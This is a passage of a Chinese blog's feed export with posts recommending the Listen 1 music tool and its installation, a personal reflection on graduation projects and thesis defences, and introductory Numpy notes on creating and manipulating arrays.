    <content><![CDATA[<p>　　随着音乐的正版化，我们常常因为歌曲版权而不得不穿梭于各个音乐平台之间，比如我很喜欢网易云音乐，可是网易云音乐中林宥嘉的很多歌曲都无法收听，所以不得不到其他平台去找，总之，非常麻烦。现在，推荐给你的是一站式音乐搜索与播放工具 Listen 1，搜歌，听歌，就用 Listen 1。</p>
<a id="more"></a>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>　　Listen 1 是一个用 Python 语言开发的免费开源综合音乐搜索工具项目，它可以用来搜索并播放来自网易云音乐，虾米，QQ 音乐三个主流音乐网站的歌曲以及收听精选音乐歌单，让你的曲库更加全面。目前，Listen 1 已经提供 Windows 和 Mac 系统的桌面版以及 Chrome 和 Firefox 浏览器插件版本。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/14-1.png" alt="14-1"></p>
<p>　　Listen 1 提供“精选歌单”、“我的歌单”、“快速搜索”以及“关于”四个功能模块。</p>
<p>　　官方网站：<a href="http://githublisten1.coding.me/listen1/" target="_blank" rel="external">http://githublisten1.coding.me/listen1/</a></p>
<p>　　Github仓库： <a href="https://github.com/listen1" target="_blank" rel="external">https://github.com/listen1</a></p>
<h4 id="桌面版安装"><a href="#桌面版安装" class="headerlink" title="桌面版安装"></a>桌面版安装</h4><p><img src="http://i.imgur.com/R6bTXkY.gif" alt="14-2"></p>
<p>　　进入官网下载：</p>
<p>　　官方网站：<a href="http://githublisten1.coding.me/listen1/" target="_blank" rel="external">http://githublisten1.coding.me/listen1/</a></p>
<p>　　注意：如果使用浏览器下载较慢，请复制下载链接使用迅雷下载。</p>
<h4 id="Google浏览器-Chrome安装"><a href="#Google浏览器-Chrome安装" class="headerlink" title="Google浏览器-Chrome安装"></a>Google浏览器-Chrome安装</h4><p>　　推荐下载浏览器插件版本，安装方便快捷，使用也很简单。</p>
<ul>
<li>下载项目的 zip 文件，在右上方有个 clone and Download，选择 Download ZIP，然后 解压到本地。下载地址：<a href="http://githublisten1.coding.me/listen1/" target="_blank" rel="external">http://githublisten1.coding.me/listen1/</a></li>
</ul>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/14-3.png" alt="14-3"></p>
<ul>
<li><p>打开 chrome 浏览器，点击右上角的设置按钮下找到更多工具，打开扩展程序，然后勾选打开页面上方的开发者模式。</p>
</li>
<li><p>点击加载已解压的扩展程序，选中刚刚解压后的文件夹即可。</p>
</li>
</ul>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/14-4.png" alt="14-4"></p>
<ul>
<li>点击 chorme 右上角 Listen 1 的图标即可打开它。</li>
</ul>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/6/14-5.png" alt="14-5"></p>
<h4 id="Firefox-浏览器打包安装"><a href="#Firefox-浏览器打包安装" class="headerlink" title="Firefox 浏览器打包安装"></a>Firefox 浏览器打包安装</h4><ul>
<li><p>打包 xpi 文件（或在 release 页面下载已经打包好的 xpi 文件）</p>
</li>
<li><p>将根目录下 manifest_firefox.json 替换 manifest.json<br>cd listen1_chrome_extension<br>zip -r ../listen1.xpi *<br>安装</p>
</li>
<li><p>打开 Firefox，加载 xpi 文件，完成安装</p>
</li>
</ul>
<h4 id="使用体验"><a href="#使用体验" class="headerlink" title="使用体验"></a>使用体验</h4><ul>
<li><p>界面简洁，没有太多的花俏，功能没有专业的音乐播放器强大，但是基本功能都有，用户体验还不错。</p>
</li>
<li><p>搜索功能强大，搜歌、听歌方便快捷，但是目前还不支持歌曲下载。</p>
</li>
<li><p>不支持用户注册登录，重装插件或清除缓存数据会导致我的歌单数据丢失，但是它提供歌单备份功能，也支持歌单导入进行数据恢复。</p>
</li>
</ul>
<hr>
<p>　　最后，向 Listen 1 的作者致敬，感谢分享感谢开源，希望这个工具能够一直走下去。</p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>软件</tag>
      </tags>
  </entry>
  <entry>
    <title>从毕业设计看如今的大学</title>
    <url>/2017/06/06/%E4%BB%8E%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1%E7%9C%8B%E5%A6%82%E4%BB%8A%E7%9A%84%E5%A4%A7%E5%AD%A6/</url>
    <content><![CDATA[<p>　　博客已经一个月没有更新，这个月里，认真完成了自己的毕业设计，也帮助了其他几位同学完成毕业设计，这期间积累了很多值得用博客来记录的东西，不管是关于技术的还是关于生活的都让我觉得这个月过得很充实。</p>
<a id="more"></a>
<p>　　按照官方的说法：毕业设计是教学过程的最后阶段采用的一种总结性的实践教学环节。通过毕业设计，学生可以综合应用所学的各种理论知识和技能，进行全面、系统、严格的技术及基本能力的练习。</p>
<p>　　作为大学最后的考核，本来应该要求认真完成，可是，直到最后我才意识到这与我想象的毕业设计真的不一样。最近看到几篇微信推送，比如《本科生毕业设计那件小事》，这几篇微信推送想要表达的大都是学生对自己的毕业设计不负责，还得老师来催。</p>
<p>　　但是，就我自己的亲身经历，我感觉并不全是这样的。虽然，确实存在着老师比学生还着急的情况，但是，至少，在我们学校，大家都还是怕毕业设计不能过，然后都还是按照老师的要求在做。只是，不同的老师的要求不一样，不同的学生对于毕业设计的认真程度有差别，比如有的老师在外面开公司，一直是通过微信与学生进行联系，只是答辩的时候出现了一下，以至于对于学生毕业论文的要求没有明确，学生也觉得老师无所谓，所以也就没有重视起来。现在的学校了有一部分不作为的老师，他们总认为不是自己不想教学生，而是学生不行，或者学生态度差，可是，他们也不想想自己到底做了多少，是否真心实意想要教好学生，还是只是为了拿工资，然后外出去赚钱。每个老师都有来自家庭的压力，需要赚钱养家，这都是可以理解的，但是此外，你有没有认真的备课，认真地在带过学生，还是已经丢弃了自己作为老师的基本素质。</p>
<p>　　不过多的吐槽大环境了，毕竟我现在也改变不了什么，还是说说自己的毕业设计吧。自从去年获得推免资格，并确定好导师后就向导师表达了要过去做毕业设计的意愿，导师的意思也是希望我能够通过毕业设计对研究生期间的研究打下基础，所以很快就在导师的建议下确定了毕设的题目：基于6LoWPAN的智能家居系统的设计于是实现。</p>
<p>　　毕业设计和自己即将开始的研究生期间的研究方向有关，并且是在即将就读研究生的学校完成的，本科的指导老师和研究生的导师对我的毕业设计都给出了很多有意义的建议，并且在做毕设期间还得到了研究生师兄师姐以及博士师兄的支持和帮助。</p>
<p>　　毕业设计分为三步进行，前期主要进行资料查阅，方案对比与缺点，中期主要进行方案的实现与测试，后期则主要进行论文的撰写。由于之前只是对简单的51单片机有所学习，还没有进行过深入的学习，所以毕业设计对我来说也是充满了挑战。</p>
<p>　　几个月的毕业设计，自己觉得确实收获不少，临近答辩的那段时期，每天晚上都是凌晨1点睡，一步步完善自己的设计，修改论文。答辩前一天也是修改PPT到很晚，虽然到最后也还是有一些问题，但至少自己觉得没有辜负大学四年。不是说我每天都在做毕设就一定做得多好，只是我觉得我的态度比一些老师更端正。</p>
<p>　　而最让我感到绝望的是毕业设计答辩，老师对于你的设计并不懂，但是他们有没有耐心去听你的描述。答辩是要求做PPT的，但是基本上都不需要你讲毕业设计的背景以及所涉及的技术，而是直接演示效果，虽然，有一部分或许是由于自己描述得不是太让人感兴趣，但是老师们的态度实在让我失望，他们本来对我这个方向并不了解，对我使用的技术也并不清楚，但是却不愿意去听。几十个人的答辩，都要求一天之内搞完，有的甚至希望是半天就要搞完，你们的时间真的如此宝贵吗？我不知道这样的答辩意义何在。虽然也听说有极少数的班级答辩很严，这是我希望看到的，而且很多人答辩完之后还是很感谢这些要求严格的老师，但是其他基本上大部分其实都已经沦为一种形式，大家只不过都在配合演出罢了。</p>
<p>　　第一次体会到做科研的孤独，自己辛辛苦苦做出来，却得不到几个人的认可，关键是别人根本不愿意听。总听说，隔行如隔山，但是，现在即使没有隔行也感觉大家挺遥远的，这也让对于即将到来的研究生生活思考了很久，同一学科也有很多研究方向，今后该何去何从呢。<br>　　<br>　　后来，毕设的成绩也让一些同学感到绝望，自己辛辛苦苦写代码写论文，却敌不过别人从网上找一个项目或者直接买一份得到的成绩高。不禁想问，我们的大学到底怎么了？记得北大钱理群教授说过的精致的利己主义者，这种不公平让投机者欢喜，却浇灭了那些踏踏实实做事的人的理想。<br>　　<br>　　面对现实的种种，我对于如今国内一些大学的教育是失望的，因为到最后，教出来的竟然是只会弄虚作假的学生，可想而知他们今后走向社会，也难怪现在的人越来越现实了，或许我也是个理想主义者，只是，我也改变不了什么。<br>　　<br>　　还好，来到新的学校，我的毕设得到的研究生期间导师的肯定，这份肯定对我来说是很重要的，这让我明白，我还可以继续为了理想而努力奋斗下去，期待三年之后不一样的自己。</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=440767547&auto=1&height=66"></iframe>]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Numpy 学习笔记（二）</title>
    <url>/2017/04/28/Python%20Numpy%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<p>　　Python Numpy 学习笔记第二篇。目前，正在学习北京理工大学嵩天老师在中国大学 MOOC 的课程：Python 数据分析与展示。</p>
<a id="more"></a>
<h4 id="ndarray数组的操作"><a href="#ndarray数组的操作" class="headerlink" title="ndarray数组的操作"></a>ndarray数组的操作</h4><h5 id="索引和切片"><a href="#索引和切片" class="headerlink" title="索引和切片"></a>索引和切片</h5><p>　　索引：获取数组中特定位置元素的过程。</p>
<p>　　切片：获取数组元素子集的过程。</p>
<ul>
<li>一维数组的索引和切片</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">2</span>]</div><div class="line"><span class="number">3</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">-2</span>]   <span class="comment"># 从右开始</span></div><div class="line"><span class="number">5</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">1</span>:<span class="number">4</span>]      <span class="comment"># 起始编号:终止编号(不含):步长</span></div><div class="line">array([<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">0</span>:<span class="number">6</span>:<span class="number">2</span>]    <span class="comment"># 指定步长为2</span></div><div class="line">array([<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>])</div></pre></td></tr></table></figure>
<ul>
<li>多维数组的索引和切片</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],[<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a</div><div class="line">array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</div><div class="line">       [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">1</span>, <span class="number">2</span>]</div><div class="line"><span class="number">6</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">-1</span>,<span class="number">-2</span>]    <span class="comment"># 从右开始</span></div><div class="line"><span class="number">5</span></div><div class="line"><span class="comment"># 选取一个维度用:，不同维度用逗号分开</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a[:<span class="number">1</span>, <span class="number">1</span>:]   <span class="comment"># 每个维度切片方法与一维数组相同</span></div><div class="line">array([[<span class="number">2</span>, <span class="number">3</span>]])</div></pre></td></tr></table></figure>
<h5 id="基本运算"><a href="#基本运算" class="headerlink" title="基本运算"></a>基本运算</h5><ul>
<li>一元函数</li>
</ul>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>np.abs(x) np.fabs(x)</td>
<td>计算数组各元素的绝对值</td>
</tr>
<tr>
<td>np.sqrt(x)</td>
<td>计算数组各元素的平方根</td>
</tr>
<tr>
<td>np.square(x)</td>
<td>计算数组各元素的平方</td>
</tr>
<tr>
<td>np.log(x) np.log10(x) np.log2(x)</td>
<td>计算数组各元素的自然对数、10底对数和2底对数</td>
</tr>
<tr>
<td>np.ceil(x) np.floor(x)</td>
<td>计算数组各元素的ceiling值 或 floor值</td>
</tr>
</tbody>
</table>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.array([<span class="number">-2</span>, <span class="number">4</span>, <span class="number">6</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.abs(a)</div><div class="line">array([<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a</div><div class="line">array([<span class="number">-2</span>,  <span class="number">4</span>,  <span class="number">6</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.fabs(a)</div><div class="line">array([ <span class="number">2.</span>,  <span class="number">4.</span>,  <span class="number">6.</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = np.square(a)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b</div><div class="line">array([ <span class="number">4</span>, <span class="number">16</span>, <span class="number">36</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.sqrt(b)</div><div class="line">array([ <span class="number">2.</span>,  <span class="number">4.</span>,  <span class="number">6.</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.log2(b)</div><div class="line">array([ <span class="number">2.</span>      ,  <span class="number">4.</span>      ,  <span class="number">5.169925</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.array([<span class="number">0.2</span>, <span class="number">1.5</span>, <span class="number">2.8</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.ceil(a)</div><div class="line">array([ <span class="number">1.</span>,  <span class="number">2.</span>,  <span class="number">3.</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.floor(a)</div><div class="line">array([ <span class="number">0.</span>,  <span class="number">1.</span>,  <span class="number">2.</span>])</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>np.rint(x)</td>
<td>计算数组各元素的四舍五入值</td>
</tr>
<tr>
<td>np.modf(x)</td>
<td>将数组各元素的小数和整数部分以两个独立数组形式返回</td>
</tr>
<tr>
<td>np.cos(x) np.cosh(x)</td>
<td>计算数组各元素的普通型和双曲型三角函数</td>
</tr>
<tr>
<td>np.sin(x) np.sinh(x)</td>
<td>计算数组各元素的普通型和双曲型三角函数</td>
</tr>
<tr>
<td>np.tan(x) np.tanh(x)</td>
<td>计算数组各元素的普通型和双曲型三角函数</td>
</tr>
<tr>
<td>np.exp(x)</td>
<td>计算数组各元素的指数值</td>
</tr>
<tr>
<td>np.sign(x)</td>
<td>计算数组各元素的符号值，1(+),0,‐1(‐)</td>
</tr>
</tbody>
</table>
<ul>
<li>二元函数</li>
</ul>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>+, ‐, <em>, /, *</em></td>
<td>两个数组各元素进行对应运算</td>
</tr>
<tr>
<td>np.maximum(x,y) np.fmax()</td>
<td>元素级的最大值/最小值计算</td>
</tr>
<tr>
<td>np.minimum(x,y) np.fmin()</td>
<td>元素级的最大值/最小值计算</td>
</tr>
<tr>
<td>np.mod(x,y)</td>
<td>元素级的模运算</td>
</tr>
<tr>
<td>np.copysign(x,y)</td>
<td>将数组y中各元素值的符号赋值给数组x对应元素</td>
</tr>
<tr>
<td>&gt;, &lt;, &gt;=, &lt;=, ==, !=</td>
<td>算术比较，产生布尔型数组</td>
</tr>
</tbody>
</table>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],[<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],[<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a + b</div><div class="line">array([[ <span class="number">2</span>,  <span class="number">4</span>,  <span class="number">6</span>],</div><div class="line">       [ <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a - b</div><div class="line">array([[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</div><div class="line">       [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a * b</div><div class="line">array([[ <span class="number">1</span>,  <span class="number">4</span>,  <span class="number">9</span>],</div><div class="line">       [<span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a / b</div><div class="line">array([[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</div><div class="line">       [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a**<span class="number">2</span></div><div class="line">array([[ <span class="number">1</span>,  <span class="number">4</span>,  <span class="number">9</span>],</div><div class="line">       [<span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.maximum(a, b)</div><div class="line">array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</div><div class="line">       [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.fmax(a, b)</div><div class="line">array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</div><div class="line">       [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.mod(a, b)</div><div class="line">array([[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</div><div class="line">       [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a &gt;= b</div><div class="line">array([[ <span class="keyword">True</span>,  <span class="keyword">True</span>,  <span class="keyword">True</span>],</div><div class="line">       [ <span class="keyword">True</span>,  <span class="keyword">True</span>,  <span class="keyword">True</span>]], dtype=bool)</div></pre></td></tr></table></figure>
<h4 id="ndarray数组的变换"><a href="#ndarray数组的变换" class="headerlink" title="ndarray数组的变换"></a>ndarray数组的变换</h4><h5 id="维度变换"><a href="#维度变换" class="headerlink" title="维度变换"></a>维度变换</h5><table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>.reshape(shape)</td>
<td>不改变数组元素，返回一个shape形状的数组，原数组不变</td>
</tr>
<tr>
<td>.resize(shape)</td>
<td>与.reshape()功能一致，但修改原数组</td>
</tr>
<tr>
<td>.swapaxes(ax1,ax2)</td>
<td>将数组n个维度中两个维度进行调换</td>
</tr>
<tr>
<td>.flatten()</td>
<td>对数组进行降维，返回折叠后的一维数组，原数组不变</td>
</tr>
</tbody>
</table>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.ones((<span class="number">2</span>,<span class="number">6</span>))</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a</div><div class="line">array([[ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>],</div><div class="line">       [ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a.reshape((<span class="number">3</span>,<span class="number">4</span>))</div><div class="line">array([[ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>],</div><div class="line">       [ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>],</div><div class="line">       [ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a</div><div class="line">array([[ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>],</div><div class="line">       [ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a.resize((<span class="number">3</span>,<span class="number">4</span>))</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a</div><div class="line">array([[ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>],</div><div class="line">       [ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>],</div><div class="line">       [ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a.flatten()</div><div class="line">array([ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a</div><div class="line">array([[ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>],</div><div class="line">       [ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>],</div><div class="line">       [ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>]])</div></pre></td></tr></table></figure>
<h5 id="类型变换"><a href="#类型变换" class="headerlink" title="类型变换"></a>类型变换</h5><p>　　astype() 方法一定会创建新的数组（原始数据的一个拷贝），即使两个类型一致。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.ones((<span class="number">2</span>,<span class="number">3</span>), dtype=np.int32)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a</div><div class="line">array([[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</div><div class="line">       [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a.astype(np.float)</div><div class="line">array([[ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>],</div><div class="line">       [ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a</div><div class="line">array([[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</div><div class="line">       [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]])</div></pre></td></tr></table></figure>
<h5 id="转换成列表"><a href="#转换成列表" class="headerlink" title="转换成列表"></a>转换成列表</h5><p>　　tolist() 方式可以实现将 ndarray 数组转换成列表。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.ones((<span class="number">2</span>,<span class="number">3</span>), dtype=np.int32)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a</div><div class="line">array([[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</div><div class="line">       [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a.tolist()</div><div class="line">[[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]]</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Numpy</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Numpy 学习笔记（一）</title>
    <url>/2017/04/14/Python%20Numpy%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<p>　　Python 科学计算库：Numpy。本博客简单介绍了 Numpy 的安装，主要介绍了 Numpy 提供的数组对象ndarray 的创建、属性与数据类型。</p>
<a id="more"></a>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>　　Numpy 是 Python 的一个开源科学计算的库，提供了矩阵运算的功能，其一般与 Scipy、matplotlib 一起使用。</p>
<p>　　NumPy 提供了两种基本的对象：ndarray（N-dimensional array object）和 ufunc（universal function object）。ndarray（(下文统一称之为数组)是存储单一数据类型的多维数组，而 ufunc 则是能够对数组进行处理的函数。</p>
<h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">pip install numpy</div></pre></td></tr></table></figure>
<h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">print</span> np.version.version</div></pre></td></tr></table></figure>
<h4 id="ndarray"><a href="#ndarray" class="headerlink" title="ndarray"></a>ndarray</h4><p>　　ndarray 是一个多维数组对象，由两部分构成：</p>
<ul>
<li>实际的数据</li>
<li>描述这些数据的元数据（数据维度、数据类型等）</li>
</ul>
<p>ndarray 数组一般要求所有元素类型相同（同质），数组下标从 0 开始</p>
<p>在 NumPy 中数组的维度（dimensions）叫做轴（axis），轴的个数叫做秩（rank）。</p>
<h5 id="创建-ndarray"><a href="#创建-ndarray" class="headerlink" title="创建 ndarray"></a>创建 ndarray</h5><ul>
<li>从 Python 中的列表、元组等类型创建 ndarray 数组</li>
</ul>
<p>　　可以使用 np.array() 方法将 Python 列表或元组转化为数组，转化后的数组元素的类型由原来的对象的类型来决定。</p>
<p>（1）一维数组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.array((<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>))  <span class="comment">#从元组创建</span></div><div class="line">array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</div></pre></td></tr></table></figure>
<p>（2）多维数组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]])   <span class="comment">#从列表创建</span></div><div class="line">array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</div><div class="line">       [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],(<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>)])   <span class="comment">#从列表和元组混合类型创建</span></div><div class="line">array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</div><div class="line">       [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]])</div></pre></td></tr></table></figure>
<p>　　当 np.array() 不指定 dtype 时，NumPy 将根据数据情况关联一个 dtype 类型。</p>
<ul>
<li>使用 NumPy 中函数创建 ndarray 数组，如：arange, ones, zeros等</li>
</ul>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>np.arange(n)</td>
<td>类似range()函数，返回ndarray类型，元素从0到n‐1</td>
</tr>
<tr>
<td>np.ones(shape)</td>
<td>根据shape生成一个全1数组，shape是元组类型</td>
</tr>
<tr>
<td>np.zeros(shape)</td>
<td>根据shape生成一个全0数组，shape是元组类型</td>
</tr>
<tr>
<td>np.full(shape,val)</td>
<td>根据shape生成一个数组，每个元素值都是val</td>
</tr>
<tr>
<td>np.eye(n)</td>
<td>创建一个正方的n*n单位矩阵，对角线为1，其余为0</td>
</tr>
<tr>
<td>np.ones_like(a)</td>
<td>根据数组a的形状生成一个全1数组</td>
</tr>
<tr>
<td>np.zeros_like(a)</td>
<td>根据数组a的形状生成一个全0数组</td>
</tr>
<tr>
<td>np.full_like(a,val)</td>
<td>根据数组a的形状生成一个数组，每个元素值都是val</td>
</tr>
<tr>
<td>np.linspace()</td>
<td>根据起止数据等间距地填充数据，形成数组</td>
</tr>
<tr>
